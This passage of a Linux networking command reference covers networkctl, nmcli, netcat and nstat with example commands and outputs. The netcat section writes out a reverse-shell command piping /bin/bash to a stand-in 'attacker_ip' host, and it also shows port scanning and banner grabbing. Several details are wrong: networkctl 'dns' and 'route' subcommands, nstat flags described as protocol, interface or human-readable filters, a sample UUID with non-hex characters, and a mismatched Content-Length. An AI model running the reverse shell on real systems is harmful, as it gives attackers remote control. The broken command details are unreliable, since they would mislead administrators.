To show all network units (e.g., configuration files for network interfaces) managed by `systemd`:

```
networkctl list
```

This shows the status of each interface and whether it's configured correctly.

### 6. **Bring a network interface up**

To **activate** or bring a network interface (e.g., `eth0`) up:

```
sudo networkctl up eth0
```

This command activates the interface and assigns it the network configuration specified in its `systemd` network file.

### 7. **Bring a network interface down**

To **deactivate** or bring a network interface (e.g., `eth0`) down:

```
sudo networkctl down eth0
```

This command disables the interface.

### 8. **Show the current network configuration**

To show the current network configuration for all interfaces managed by `systemd-networkd`:

```
networkctl status
```

### 9. **Restart a network interface**

To **restart** a network interface (e.g., `eth0`):

```
sudo networkctl restart eth0
```

This is useful if you need to reapply the configuration to the interface.

### 10. **Show systemd network devices**

To show a list of all network devices recognized by `systemd` (interfaces, bonds, bridges, etc.):

```
networkctl status
```

### 11. **Show the default route (gateway)**

To view the **default route** (gateway) for the system:

```
networkctl route
```

This shows the routing table, including the default gateway and network routes.

### 12. **Show the DNS configuration**

To display the **DNS configuration** being used by the system (as set by `systemd-resolved`):

```
networkctl dns
```

### 13. **Show network information in a machine-readable format**

To display network information in a **machine-readable format** (JSON):

```
networkctl status --json
```

This is useful for scripting or programmatically processing the output.

---

### Example Outputs:

1. **List all network interfaces:**

   ```
   $ networkctl
   IDX  LINK  TYPE  OPERATIONAL  SETUP
    1    lo    loop  routable     configured
    2    eth0  ether  routable     configured
    3    wlan0 wlan  deconfigured  configured
   ```

2. **Show detailed status of `eth0`:**

   ```
   $ networkctl status eth0
   ● eth0
        Link File: /etc/systemd/network/10-eth0.network
     Network File: /etc/systemd/network/10-eth0.network
             Type: ether
            State: routable
       Address: 192.168.1.100
    MTU Size: 1500
   ```

3. **Bring `eth0` up:**

   ```
   $ sudo networkctl up eth0
   ```

4. **Show the DNS settings:**

   ```
   $ networkctl dns
   DNS Servers: 192.168.1.1
   ```

5. **Restart `eth0` network interface:**

   ```
   $ sudo networkctl restart eth0
   ```

6. **Show the current network routes:**

   ```
   $ networkctl route
   Default Route: 192.168.1.1
   ```
</details>
<details>
<summary>nmcli</summary>

The `nmcli` command is the command-line interface for **NetworkManager**, a service that manages network connections on Linux-based systems. It provides a powerful way to manage and configure network connections, interfaces, and Wi-Fi settings, and it's commonly used in environments where `NetworkManager` is the default network management tool (e.g., on many desktop and server distributions).

### 1. **Show all available network connections**

To display a list of all available **network connections** (both active and inactive):

```
nmcli connection show
```

This will list all saved network connections, including Wi-Fi, Ethernet, and VPN connections.

### 2. **Show active network connections**

To show only **active network connections**:

```
nmcli connection show --active
```

This will display the currently active network interfaces and their status.

### 3. **Show network interfaces**

To display all **network interfaces** managed by NetworkManager (including wired, wireless, and virtual interfaces):

```
nmcli device
```

This will list devices like `eth0`, `wlan0`, etc., along with their statuses (e.g., `connected`, `disconnected`, `unmanaged`).

### 4. **Connect to a Wi-Fi network**

To connect to a **Wi-Fi network**:

```
nmcli device wifi connect <SSID> password <PASSWORD>
```

Example:

```
nmcli device wifi connect "MyWiFi" password "MyPassword"
```

This will connect to the specified Wi-Fi network. Replace `<SSID>` with the network name and `<PASSWORD>` with the network's password.

### 5. **Disconnect from a network**

To **disconnect** a device from its current network (e.g., Wi-Fi or Ethernet):

```
nmcli connection down <connection_name>
```

For example, to disconnect from a Wi-Fi network:

```
nmcli connection down "MyWiFi"
```

### 6. **Enable or disable a network interface**

To **enable** a network interface (e.g., `eth0` or `wlan0`):

```
nmcli device set eth0 managed yes
nmcli device connect eth0
```

To **disable** a network interface:

```
nmcli device disconnect eth0
```

### 7. **Show details of a specific connection**

To show detailed information about a **specific network connection**:

```
nmcli connection show <connection_name>
```

For example:

```
nmcli connection show "MyWiFi"
```

This will display detailed configuration, including IP settings, DNS, routes, etc.

### 8. **Create a new Ethernet connection**

To create a **new Ethernet connection** (static IP setup example):

```
nmcli connection add type ethernet con-name "MyEthernet" ifname eth0 ip4 192.168.1.100/24 gw4 192.168.1.1
```

This command creates a new Ethernet connection named `MyEthernet` on the `eth0` interface, with a static IP address of `192.168.1.100/24` and a gateway of `192.168.1.1`.

### 9. **Create a new Wi-Fi connection**

To create a **new Wi-Fi connection** (with WPA2 encryption):

```
nmcli connection add type wifi con-name "MyWiFi" ifname wlan0 ssid "MyWiFi" wifi-sec.key-mgmt wpa-psk wifi-sec.psk "MyPassword"
```

This creates a new Wi-Fi connection called `MyWiFi` on the `wlan0` interface, using WPA2 encryption and the specified password.

### 10. **Set a static IP address for an Ethernet connection**

To set a **static IP address** for an Ethernet connection:

```
nmcli connection modify "MyEthernet" ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns "8.8.8.8"
nmcli connection up "MyEthernet"
```

This command sets a static IP (`192.168.1.100/24`), gateway (`192.168.1.1`), and DNS (`8.8.8.8`) for the `MyEthernet` connection and then brings it up.

### 11. **Set DNS servers for a connection**

To set custom **DNS servers** for a connection:

```
nmcli connection modify "MyEthernet" ipv4.dns "8.8.8.8,8.8.4.4"
```

This modifies the `MyEthernet` connection to use Google’s DNS servers (`8.8.8.8` and `8.8.4.4`).

### 12. **Show detailed Wi-Fi information**

To show detailed **Wi-Fi information** (e.g., available Wi-Fi networks):

```
nmcli device wifi list
```

This will list all available Wi-Fi networks along with details like signal strength, security type, etc.

### 13. **Scan for Wi-Fi networks**

To **scan** for available Wi-Fi networks:

```
nmcli device wifi rescan
```

After scanning, you can list available networks using `nmcli device wifi list`.

### 14. **Set the Wi-Fi mode (Access Point or Client)**

To set the **Wi-Fi interface mode** to **access point** (for creating a hotspot):

```
nmcli device wifi hotspot ifname wlan0 con-name "MyHotspot" ssid "MyHotspotSSID" band a channel 6 password "HotspotPassword"
```

This will create a Wi-Fi hotspot on the `wlan0` interface, using the SSID `MyHotspotSSID` and the password `HotspotPassword`.

### 15. **Show VPN connections**

To list all active **VPN connections**:

```
nmcli connection show --active | grep vpn
```

This will display the active VPN connections, if any.

### 16. **Turn off NetworkManager (disable networking)**

To **disable NetworkManager** and bring down all interfaces:

```
sudo nmcli networking off
```

### 17. **Turn on NetworkManager (enable networking)**

To **enable NetworkManager** and bring up interfaces:

```
sudo nmcli networking on
```

### 18. **Delete a connection**

To **delete** a network connection (e.g., `MyWiFi`):

```
nmcli connection delete "MyWiFi"
```

This will remove the connection configuration from `NetworkManager`.

---

### Example Outputs:

1. **List all available network connections:**

   ```
   $ nmcli connection show
   NAME           UUID                                  TYPE      DEVICE
   MyWiFi         1234abcd-56ef-78gh-90ij-klmn12345678  wifi      wlan0
   WiredEthernet  5678abcd-12ef-34gh-56ij-lmno98765432  ethernet  eth0
   ```

2. **Show active network connections:**

   ```
   $ nmcli connection show --active
   NAME           UUID                                  TYPE      DEVICE
   MyWiFi         1234abcd-56ef-78gh-90ij-klmn12345678  wifi      wlan0
   ```

3. **Show Wi-Fi networks:**

   ```
   $ nmcli device wifi list
   SSID              BSSID              MODE   CHAN  RATE        SIGNAL  BARS  SECURITY
   MyWiFi            00:11:22:33:44:55  Infra  6     54 Mbit/s   70      ▂▄▆_  WPA2
   MyNeighborWiFi    66:77:88:99:00:11  Infra  11    54 Mbit/s   40      ▂▄__  WPA
   ```

4. **Connect to a Wi-Fi network:**

   ```
   $ nmcli device wifi connect "MyWiFi" password "MyPassword"
   ```

5. **Set a static IP address:**

   ```
   $ nmcli connection modify "WiredEthernet" ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns "8.8.8.8,8.8.4.4"
   $ nmcli connection up "WiredEthernet"
   ```

6. **Create a new Wi-Fi hotspot:**

   ```
   $ nmcli device wifi hotspot ifname wlan0 con-name "MyHotspot" ssid "MyHotspotSSID" band a channel 6 password "HotspotPassword"
   ```
</details>
<details>
<summary>netcat</summary>

The `netcat` command (often abbreviated as `nc`) is a powerful and versatile network utility used for reading from and writing to network connections using TCP or UDP. It is widely used for testing network connections, transferring data, port scanning, and as a basic network troubleshooting tool.

### 1. **Basic Port Scanning**

To **scan a specific port** (e.g., `80`) on a remote server (e.g., `example.com`):

```
nc -zv example.com 80
```

* `-z`: Scan without sending any data (only check if the port is open).
* `-v`: Verbose mode, show more information.

To scan a **range of ports** (e.g., ports 80 to 90):

```
nc -zv example.com 80-90
```

### 2. **Check if a Port is Open**

To check if a **specific port** (e.g., `22` for SSH) is open on a remote host:

```
nc -zv example.com 22
```

This will tell you whether port 22 is open or closed on `example.com`.

### 3. **Listen on a Specific Port**

To **listen** on a local port (e.g., port `12345`) and display any incoming data:

```
nc -l 12345
```

This command starts `nc` in listening mode on port `12345`. Any data sent to that port will be displayed in the terminal.

### 4. **Listen for Connections on a Specific Port (with Verbose Output)**

To listen on a port with more detailed output (i.e., show when connections are established):

```
nc -lv 12345
```

* `-l`: Listen mode.
* `-v`: Verbose output.

### 5. **Transfer a File Using Netcat (TCP)**

To **send a file** (`file.txt`) from one machine to another using netcat, you would need to execute two commands on different machines:

#### On the receiving machine (listening for a connection):

```
nc -l 12345 > received_file.txt
```

#### On the sending machine (transferring the file):

```
nc example.com 12345 < file.txt
```

This will send the contents of `file.txt` to the receiving machine, which writes it to `received_file.txt`.

### 6. **Create a Simple Chat Server**

To create a simple **chat server** that listens on port `12345`:

```
nc -l 12345
```

Then, on the client machine, connect to the server:

```
nc server_address 12345
```

Now, both machines can send messages back and forth.

### 7. **Connecting to a Remote Service**

To **connect** to a remote service (e.g., HTTP on port `80`) and send a simple HTTP GET request:

```
nc example.com 80
```

Then type the following:

```
GET / HTTP/1.1
Host: example.com

```

This sends a raw HTTP request, and the server will respond with the HTTP headers and the page content.

### 8. **Reverse Shell (Remote Access)**

To create a simple **reverse shell**, where the target machine connects back to the attacker's machine (use with caution and only in legal contexts):

#### On the attacker's machine (listening for a connection):

```
nc -lvp 12345
```

* `-l`: Listen mode.
* `-v`: Verbose output.
* `-p`: Specify the port.

#### On the target machine (connecting to the attacker’s machine):

```
nc attacker_ip 12345 -e /bin/bash
```

This command connects to the attacker's machine and opens a shell, allowing the attacker to run commands remotely. (Note: This is often used maliciously, so ensure it's only used for ethical testing.)

### 9. **UDP Communication (Sending Data)**

To **send UDP** data to a specific port (e.g., `12345`) on a remote host:

```
echo "Hello, world!" | nc -u example.com 12345
```

* `-u`: Use UDP instead of TCP.

### 10. **UDP Server Listening**

To listen for incoming UDP packets on port `12345`:

```
nc -lu 12345
```

This will display any UDP data sent to port `12345`.

### 11. **Pipe Output to Netcat**

To pipe the output of a command (e.g., `ls` or `df`) to netcat:

```
ls | nc -l 12345
```

This sends the output of the `ls` command (a list of files in the current directory) to anyone who connects to port `12345`.

### 12. **Test a Web Server**

To manually send an HTTP request and retrieve a response:

```
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```

This simulates an HTTP GET request to `example.com` and displays the HTTP response.

### 13. **Banner Grabbing**

To perform a **banner grab** (retrieve information about a service running on a port, e.g., SSH):

```
nc -v example.com 22
```

This connects to port `22` (SSH) and may display the version of the SSH server in the banner.

### 14. **Send a Custom HTTP Request**

You can send custom HTTP requests to interact with web servers, for example:

```
echo -e "POST /login HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 18\r\n\r\nusername=admin&pass=1234" | nc example.com 80
```

This sends a raw HTTP POST request to the web server on `example.com`, which can be useful for testing web applications.

---

### Example Outputs:

1. **Listening for a connection (Receiving Data)**:

   ```
   $ nc -l 12345
   Hello from client!
   ```

2. **Port Scanning Output (Port 80 is open)**:

   ```
   $ nc -zv example.com 80
   example.com [192.168.1.100] 80 open
   ```

3. **Send a File via Netcat**:
   On the receiving machine:

   ```
   $ nc -l 12345 > received_file.txt
   ```

   On the sending machine:

   ```
   $ nc example.com 12345 < file.txt
   ```

4. **Simple HTTP Request (GET Request)**:

   ```
   $ echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
   HTTP/1.1 200 OK
   Server: Apache
   Content-Type: text/html; charset=UTF-8
   Content-Length: 1256
   Date: Mon, 01 Jan 2025 00:00:00 GMT
   ```

5. **UDP Communication**:

   ```
   $ echo "Test message" | nc -u example.com 12345
   ```
</details>
<details>
<summary>nstat</summary>

The `nstat` command is used to display network statistics in Linux systems. It provides various statistics about the network, including information about TCP, UDP, and other network protocols. This command can be helpful in network troubleshooting, performance monitoring, and general network analysis.

### 1. **Display all network statistics**

To display **all available network statistics**:

```
nstat
```

This will show a broad range of network statistics, including information on both TCP and UDP connections, as well as network interface statistics.

### 2. **Display TCP statistics**

To display **TCP-related statistics**:

```
nstat -t
```

This will provide detailed information about TCP connections, including statistics like the number of established connections, retransmissions, and more.

### 3. **Display UDP statistics**

To display **UDP-related statistics**:

```
nstat -u
```

This will display statistics specific to UDP, such as the number of received UDP packets, sent packets, and errors.

### 4. **Display network statistics for a specific protocol**

You can specify a protocol to view its statistics, such as:

* **TCP**:

  ```
  nstat -t
  ```
* **UDP**:

  ```
  nstat -u
  ```
* **ICMP** (Internet Control Message Protocol):

  ```
  nstat -i
  ```

### 5. **Display statistics for a specific connection**

To display **network statistics** for a specific connection, such as `tcp`, `udp`, or `ip`:

```
nstat -s
```

This will provide a summary of all statistics categorized by connection types (e.g., TCP, UDP).

### 6. **Display statistics for a specific network interface**

To display statistics for a specific network **interface** (e.g., `eth0`):

```
nstat -i eth0
```

This command will display the network statistics specific to the `eth0` interface, including packet counts, byte counts, errors, and more.

### 7. **Display summary statistics**

To get a **summary of all protocols**:

```
nstat -s
```

This will display the most important statistics of different network protocols in a summarized format.

### 8. **Display the statistics in human-readable form**

To display network statistics in a more **human-readable format**, you can use the `-h` flag:

```
nstat -h
```

This will attempt to display the statistics with more user-friendly units (e.g., converting bytes to kilobytes or megabytes).

### 9. **Display extended information for UDP statistics**

To display more **detailed UDP statistics**:

```
nstat -u -e
```

The `-e` flag provides extended statistics related to UDP packets, including information like receive errors, dropped packets, etc.

### 10. **Display detailed TCP statistics**

To display **detailed TCP statistics**:

```
nstat -t -e
```

This will give you detailed stats on TCP, such as retransmission counts, connection attempts, and more.

---

### Example Outputs:

1. **All network statistics**:

   ```
   $ nstat
   TcpExtTCPInSegs         12345678
   TcpExtTCPOutSegs        8765432
   UdpInDatagrams          23456
   UdpOutDatagrams         12345
   IcmpInMsgs              34567
   IcmpOutMsgs             23456
   ```

2. **Display TCP statistics**:

   ```
   $ nstat -t
   TcpExtTCPInSegs         12345678
   TcpExtTCPOutSegs        8765432
   TcpExtTCPRetransSegs    54321
   TcpExtTCPLostRetransSegs 1234
   ```

3. **Display UDP statistics**:

   ```
   $ nstat -u
   UdpInDatagrams          23456
   UdpOutDatagrams         12345
   ```

4. **Display statistics for a specific interface (`eth0`)**:

   ```
   $ nstat -i eth0
   eth0:  2345678 packets received, 4567890 packets sent
   eth0:  errors: 123
   ```

5. **Display statistics summary**:

   ```
   $ nstat -s
   TcpInSegs          12345678
   TcpOutSegs         8765432
   UdpInDatagrams     23456
   UdpOutDatagrams    12345
   IcmpInMsgs         34567
   IcmpOutMsgs        23456
   ```

6. **Display statistics in human-readable form**:

   ```
   $ nstat -h
   TcpInSegs          12.3M
   TcpOutSegs         8.7M
   UdpInDatagrams     23K
   UdpOutDatagrams    12K
   ```
</details>
